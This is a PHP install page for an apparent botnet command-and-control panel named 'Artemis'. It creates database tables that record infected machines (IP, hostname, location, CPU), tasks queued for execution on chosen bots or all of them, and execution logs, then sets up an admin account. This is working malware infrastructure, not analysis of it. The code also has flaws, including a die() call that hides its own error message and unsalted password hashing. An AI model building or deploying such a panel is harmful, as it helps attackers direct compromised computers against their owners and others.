<?php
	session_start();
	require_once 'include/main.php';

	if(isset($_POST['submit'])) {
		$errMsg = '';
		$sucessMsg = '';

		try
		{
			$currentuser = $conn->prepare("SELECT id FROM users WHERE 1 = 1"); // Select all users
			$currentuser->execute();
			$rows = $currentuser->rowCount();
		}
		catch(PDOException $e)
		{
			if(defined("_DEBUG"))
			{
				$temperror = $e;
			}
			$rows = 0;
		}
		if($rows > 0) { // If we already have a user tell them to fuck off
			$errMsg .= "ERROR: Allready installed <br>";
			die();
		}

		$username = $_POST['username'];
		$password = $_POST['password'];
		$passwordc = $_POST['passwordconfim'];

		if($username == '')
			$errMsg .= 'ERROR: You must enter your Username <br>';

		if($password == '')
			$errMsg .= 'ERROR: You must enter your Password <br>';

		if($password !== $passwordc) {
			$errMsg .= 'ERROR: Passwords do not match <br>';
		}
		/* ARCH 1 is 32/64 and ARCH2 is ARM/X86 */
		if($errMsg == '') {
			try {
				$botcreate = $conn->prepare("
					CREATE TABLE IF NOT EXISTS bots(
					bot_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
					bot_key CHAR(20) NOT NULL,
					bot_version VARCHAR(8) NOT NULL,
					bot_ip VARCHAR(16) NOT NULL,
					bot_hostname VARCHAR(255) NOT NULL,
					bot_location_country CHAR(2) NOT NULL,
					bot_location_region VARCHAR(255) NOT NULL,
					bot_location_city VARCHAR(255) NOT NULL,
					bot_cpu_cores TINYINT(3) UNSIGNED NOT NULL,
					bot_cpu_mhz SMALLINT(5) UNSIGNED NOT NULL,
					bot_cpu_bogus SMALLINT(7) UNSIGNED NOT NULL,
					bot_cpu_arch TINYINT(2) UNSIGNED NOT NULL,
					bot_cpu_arch2 VARCHAR(15) NOT NULL,
					bot_date_last DATETIME NOT NULL,
					bot_date_join DATETIME NOT NULL,
					PRIMARY KEY (bot_id)) ENGINE=InnoDB");
				$botcreate->execute();
			}
			catch(PDOException $e) {
				if(defined("_DEBUG")) {
					$errMsg .= 'ERROR: Bot table creation failed: ' . $e->getMessage() . '<br>';
				}
				else {
					$errMsg .= 'ERROR: Bot table creation failed <br>';
				}
			}

			try {
				$usercreate = $conn->prepare("
					CREATE TABLE IF NOT EXISTS users(
					id INT UNSIGNED NOT NULL AUTO_INCREMENT,
					admin TINYINT(1) UNSIGNED NOT NULL,
					lastseen INTEGER(11) UNSIGNED NOT NULL,
					lastip VARCHAR(16) NOT NULL,
					username VARCHAR(255) NOT NULL,
					password CHAR(128) NOT NULL,
					PRIMARY KEY (id)) ENGINE=InnoDB");
				$usercreate->execute();
			}
			catch(PDOException $e) {
				if(defined("_DEBUG")) {
					$errMsg .= 'ERROR: User table creation failed: ' . $e->getMessage() . '<br>';
				}
				else {
					$errMsg .= 'ERROR: User table creation failed <br>';
				}
			}

			try {
				/*
				id = task id
				task = task to exec
				param = parameters
				user = user who order task
				count = how many bots have executed it
				key = bot key to execute (0 is all) also it should be CHAR(20) cuz keys are 20 BUT becasuse we use 0 as all ill use VARCHAR(20)
				*/
				$taskcreate = $conn->prepare("
					CREATE TABLE IF NOT EXISTS tasks(
					id INT UNSIGNED NOT NULL AUTO_INCREMENT,
					task INT UNSIGNED NOT NULL,
					parameters VARCHAR(255),
					user VARCHAR(16) NOT NULL,
					count INT UNSIGNED NOT NULL,
					bkey VARCHAR(20),
					PRIMARY KEY (id)) ENGINE=InnoDB");
				$taskcreate->execute();
			}
			catch(PDOException $e)
			{
				if (defined("DEBUG")) {
					$errMsg .= 'ERROR: Task table creation failed: ' . $e->getMessage() . '<br>';
				}
				else {
					$errMsg .= 'ERROR: Task table creation failed <br>';
				}
			}
			try {
				/*
				taskid = id of task
				key = bots key
				*/
				$logcreate = $conn->prepare("
					CREATE TABLE IF NOT EXISTS logs(
					id INT UNSIGNED NOT NULL AUTO_INCREMENT,
					taskid INT UNSIGNED NOT NULL,
					bkey CHAR(20) NOT NULL,
					PRIMARY KEY (id)) ENGINE=InnoDB");
				$logcreate->execute();
			}
			catch(PDOException $e) {
				if(defined("_DEBUG")) {
					$errMsg .= 'ERROR: Log table creation failed: ' . $e->getMessage() . '<br>';
				}
				else {
					$errMsg .= 'ERROR: Log table creation failed <br>';
				}
			}

			$hashpass = hash("sha512", $password);
			$admin = 1;

			try {
				$insert = $conn->prepare("INSERT INTO users (username, password, admin, lastip, lastseen) VALUES (:user, :pass, :admin, :ip, 0)");
				$insert->execute(array(':user'=>$username, ':pass'=>$hashpass, ':admin'=>$admin, ':ip'=>$_SERVER['REMOTE_ADDR']));
			}
			catch(PDOException $e) {
				$errMsg .= 'ERROR: User insert failed: ' . $e->getMessage() . '<br>';
			}
			header('location: login/');
		}
		if(isset($temperror)) {
			$errMsg .= 'ERROR: User table creation failed: ' . $temperror . '(This is normal if it is first install)<br>';
		}
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<title>Artemis - Install</title>
		<link href="../css/main.css" rel="stylesheet">
	</head>
	<body>
		<div align="center">
			<div style="width: 500px; border: solid 1px #e0e0d1; text-align: center;" align="left">
				<?php
					if(isset($errMsg)) {
						echo '<div style="color: #FF0000; text-align: center; font-size: 16px;">'.$errMsg.'</div>';
					}
				?>
				<div style="background-color: #000000; color: #FFFFFF; padding: 3px; text-align: center;">
					<b>Install</b>
				</div>
				<div style="margin: 30px">
					<form action="" method="post">
						<input type="text" name="username" class="box" placeholder='Username'/><br/><br/>
						<input type="password" name="password" class="box" placeholder='Password'/><br/><br/>
						<input type="password" name="passwordconfim" class="box" placeholder='Password Confirmation'/><br/><br/>
						<input type="submit" name='submit' value="Install" class='submit'/><br/>
					</form>
				</div>
			</div>
		</div>
	</body>
</html>
